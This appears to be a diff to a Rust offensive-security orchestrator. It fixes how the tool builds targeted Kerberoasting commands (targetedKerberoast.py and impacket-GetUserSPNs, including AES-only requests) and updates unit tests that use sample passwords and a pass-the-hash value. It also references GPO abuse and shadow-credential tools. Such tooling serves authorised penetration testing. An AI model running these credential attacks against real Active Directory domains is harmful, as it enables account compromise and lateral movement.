@@ -526,16 +526,15 @@ pub fn build_pywhisker(args: &Value) -> Result<CommandBuilder> {
 /// Optional args: `etype_hint` (array of Kerberos etype names, e.g.
 ///   `["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"]`)
 ///
-/// When `etype_hint` is absent we invoke `targetedKerberoast.py`, which
-/// issues the TGS-REQ with the default etype priority (RC4 first).
+/// When the hint leaves RC4 in play (or is absent) we invoke
+/// `targetedKerberoast.py`, which issues the TGS-REQ with the default etype
+/// priority (RC4 first).
 ///
-/// When `etype_hint` is present we switch to `impacket-GetUserSPNs
-/// -request-user <target_user> -supported-enctypes <bitmask>` because
-/// `targetedKerberoast.py` exposes no etype-selection flag. Bug E: after a
-/// `KDC_ERR_ETYPE_NOSUPP` rejection the orchestrator dispatches an AES-only
-/// retry — passing the hint to a tool that always issues RC4 would just
-/// loop until the SPN account locks out. The bitmask follows
-/// `msDS-SupportedEncryptionTypes`: AES256=0x10, AES128=0x08, RC4=0x04.
+/// When the hint is AES-only we switch to `impacket-GetUserSPNs -request-user
+/// <target_user> -no-rc4`, because `targetedKerberoast.py` exposes no
+/// etype-selection flag. Bug E: after a `KDC_ERR_ETYPE_NOSUPP` rejection the
+/// orchestrator dispatches an AES-only retry — passing the hint to a tool that
+/// always issues RC4 would just loop until the SPN account locks out.
 pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
     build_targeted_kerberoast(args)?.execute().await
 }
@@ -549,9 +548,7 @@ pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
     let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
     let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
 
-    let etype_mask = etype_hint_bitmask(args);
-
-    let cmd = if let Some(mask) = etype_mask {
+    let cmd = if credentials::etype_hint_is_aes_only(args) {
         // Switch to impacket-GetUserSPNs because targetedKerberoast.py has
         // no etype selector. `-request-user` limits the dispatch to the
         // single SPN account so we don't trigger a forest-wide kerberoast
@@ -584,22 +581,19 @@ pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
             .arg(dc_ip)
             .arg("-request-user")
             .arg(target_user)
-            .arg("-supported-enctypes")
-            .arg(mask.to_string())
+            .arg("-no-rc4")
             .timeout_secs(120)
     } else {
         let mut cmd = CommandBuilder::new("targetedKerberoast.py")
             .flag("-d", domain)
             .flag("-u", username)
-            .flag("-t", target_user)
-            .flag("-dc-ip", dc_ip);
+            .flag("--request-user", target_user)
+            .flag("--dc-ip", dc_ip);
 
         if let Some(tpath) = ticket_path {
-            // targetedKerberoast.py is an impacket-based script; it honors
-            // `-k` + `KRB5CCNAME` and `-no-pass` (impacket single-dash form).
             cmd = cmd
                 .arg("-k")
-                .arg("-no-pass")
+                .arg("--no-pass")
                 .env("KRB5CCNAME", tpath)
                 .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
         } else if let Some(h) = hash {
@@ -608,7 +602,7 @@ pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
             } else {
                 format!(":{h}")
             };
-            cmd = cmd.arg("-H").arg(nt).arg("-no-pass");
+            cmd = cmd.arg("-H").arg(nt);
         } else {
             let password = required_str(args, "password")?;
             cmd = cmd.flag("-p", password);
@@ -617,40 +611,6 @@ pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
         cmd.timeout_secs(120)
     };
     Ok(cmd)
-}
-
-/// Translate an `etype_hint` array into the `msDS-SupportedEncryptionTypes`
-/// bitmask impacket-GetUserSPNs reads via `-supported-enctypes`. Returns
-/// `None` when the hint is missing or empty — callers fall back to the
-/// no-etype-selection path. Unknown etype strings are skipped with a
-/// `tracing::warn!` so a future etype name addition doesn't silently bake
-/// a zero bitmask into the dispatch.
-fn etype_hint_bitmask(args: &Value) -> Option<u32> {
-    let arr = args.get("etype_hint").and_then(|v| v.as_array())?;
-    let mut mask: u32 = 0;
-    for v in arr {
-        let Some(name) = v.as_str() else { continue };
-        let bit = match name.to_ascii_lowercase().as_str() {
-            "aes256-cts-hmac-sha1-96" | "aes256" | "aes256-cts" => 0x10,
-            "aes128-cts-hmac-sha1-96" | "aes128" | "aes128-cts" => 0x08,
-            "rc4-hmac" | "rc4_hmac" | "rc4" | "arcfour-hmac" => 0x04,
-            "des-cbc-md5" | "des_cbc_md5" => 0x02,
-            "des-cbc-crc" | "des_cbc_crc" => 0x01,
-            other => {
-                tracing::warn!(
-                    etype = %other,
-                    "targeted_kerberoast: unknown etype_hint value, ignored"
-                );
-                continue;
-            }
-        };
-        mask |= bit;
-    }
-    if mask == 0 {
-        None
-    } else {
-        Some(mask)
-    }
 }
 
 /// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
@@ -1893,20 +1853,40 @@ mod tests {
         });
         let cmd = super::build_targeted_kerberoast(&args).unwrap();
         let args_vec = cmd.args_for_test();
-        // AES256(0x10) | AES128(0x08) = 24
-        let mask_idx = args_vec
-            .iter()
-            .position(|a| a == "-supported-enctypes")
-            .expect("etype_hint must produce -supported-enctypes flag");
-        assert_eq!(
-            args_vec.get(mask_idx + 1).map(String::as_str),
-            Some("24"),
-            "AES256+AES128 etype_hint must serialize to the msDS-SupportedEncryptionTypes \
-             bitmask value 24 (0x18) so impacket-GetUserSPNs requests AES-only TGS"
+        assert!(
+            args_vec.iter().any(|a| a == "-no-rc4"),
+            "AES-only etype_hint must suppress the RC4-first TGS-REQ"
+        );
+        assert!(
+            args_vec.iter().all(|a| a != "-supported-enctypes"),
+            "impacket-GetUserSPNs has no -supported-enctypes flag; passing one \
+             makes argparse reject the whole invocation"
         );
         assert!(
             args_vec.iter().any(|a| a == "-request-user"),
             "expected -request-user flag to scope the kerberoast"
+        );
+    }
+
+    #[test]
+    fn targeted_kerberoast_etype_hint_including_rc4_keeps_default_tool() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "username": "carol",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.20",
+            "target_user": "sql_svc",
+            "etype_hint": ["aes256-cts-hmac-sha1-96", "rc4-hmac"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(
+            args_vec.iter().all(|a| a != "-no-rc4"),
+            "a hint that still permits RC4 must not force the AES-only path"
+        );
+        assert!(
+            args_vec.iter().any(|a| a == "--request-user"),
+            "RC4-permitting hint stays on targetedKerberoast.py"
         );
     }
 
@@ -1920,18 +1900,22 @@ mod tests {
             "target_user": "svc_sql",
         });
         let cmd = super::build_targeted_kerberoast(&args).unwrap();
-        // The legacy `-t` flag is targetedKerberoast.py's per-user selector;
-        // impacket-GetUserSPNs uses `-request-user` instead. Either presence
-        // is sufficient to confirm the fallback path is reached, but the -t
-        // flag pins the implementation choice when no etype_hint is set.
         let args_vec = cmd.args_for_test();
         assert!(
-            args_vec.iter().any(|a| a == "-t"),
-            "no etype_hint → must invoke targetedKerberoast.py (-t flag)"
+            args_vec.iter().any(|a| a == "--request-user"),
+            "targetedKerberoast.py's per-user selector is --request-user"
         );
         assert!(
-            args_vec.iter().all(|a| a != "-supported-enctypes"),
-            "no etype_hint → must NOT pass -supported-enctypes"
+            args_vec.iter().all(|a| a != "-t"),
+            "targetedKerberoast.py defines no -t flag; argparse aborts on it"
+        );
+        assert!(
+            args_vec.iter().any(|a| a == "--dc-ip"),
+            "targetedKerberoast.py uses the double-dash --dc-ip"
+        );
+        assert!(
+            args_vec.iter().all(|a| a != "-dc-ip"),
+            "the impacket single-dash -dc-ip is not accepted here"
         );
     }
 
@@ -2286,10 +2270,9 @@ mod tests {
         });
         let cmd = super::build_targeted_kerberoast(&args).unwrap();
         let args_vec = cmd.args_for_test();
-        // No-etype branch uses targetedKerberoast.py (-t flag present).
-        assert!(args_vec.iter().any(|a| a == "-t"));
+        assert!(args_vec.iter().any(|a| a == "--request-user"));
         assert!(args_vec.iter().any(|a| a == "-k"));
-        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(args_vec.iter().any(|a| a == "--no-pass"));
         assert!(args_vec.iter().all(|a| a != "-p"));
         assert!(cmd
             .env_vars_for_test()
@@ -2308,13 +2291,16 @@ mod tests {
         });
         let cmd = super::build_targeted_kerberoast(&args).unwrap();
         let args_vec = cmd.args_for_test();
-        // targetedKerberoast.py uses `-H` (single-dash impacket style) for hashes.
         let idx = args_vec.iter().position(|a| a == "-H").unwrap();
         assert_eq!(
             args_vec.get(idx + 1).map(String::as_str),
             Some(":31d6cfe0d16ae931b73c59d7e0c089c0"),
         );
-        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(
+            args_vec.iter().all(|a| a != "--no-pass"),
+            "-H and --no-pass share targetedKerberoast.py's mutually exclusive \
+             secrets group; emitting both aborts the run"
+        );
         assert!(args_vec.iter().all(|a| a != "-p"));
     }
 
@@ -2330,7 +2316,7 @@ mod tests {
         });
         let cmd = super::build_targeted_kerberoast(&args).unwrap();
         let args_vec = cmd.args_for_test();
-        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
+        assert!(args_vec.iter().any(|a| a == "-no-rc4"));
         assert!(args_vec.iter().any(|a| a == "-k"));
         assert!(args_vec.iter().any(|a| a == "-no-pass"));
         assert!(cmd
@@ -2358,7 +2344,7 @@ mod tests {
         });
         let cmd = super::build_targeted_kerberoast(&args).unwrap();
         let args_vec = cmd.args_for_test();
-        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
+        assert!(args_vec.iter().any(|a| a == "-no-rc4"));
         // impacket-GetUserSPNs uses `-hashes` (single-dash) for PtH.
         let idx = args_vec.iter().position(|a| a == "-hashes").unwrap();
         assert_eq!(
@@ -2378,27 +2364,6 @@ mod tests {
             "target_user": "svc_sql",
         });
         assert!(super::build_targeted_kerberoast(&args).is_err());
-    }
-
-    #[test]
-    fn etype_hint_bitmask_handles_unknown_etypes() {
-        let args = json!({
-            "etype_hint": ["unknown-cipher", "aes256-cts-hmac-sha1-96"],
-        });
-        let mask = super::etype_hint_bitmask(&args).unwrap();
-        assert_eq!(mask, 0x10, "only the known AES256 bit should be set");
-    }
-
-    #[test]
-    fn etype_hint_bitmask_none_when_array_missing() {
-        let args = json!({"foo": "bar"});
-        assert!(super::etype_hint_bitmask(&args).is_none());
-    }
-
-    #[test]
-    fn etype_hint_bitmask_none_when_all_unknown() {
-        let args = json!({"etype_hint": ["completely-bogus"]});
-        assert!(super::etype_hint_bitmask(&args).is_none());
     }
 
     // ── hash / ticket auth for the bloodyAD + dacledit family ───────────
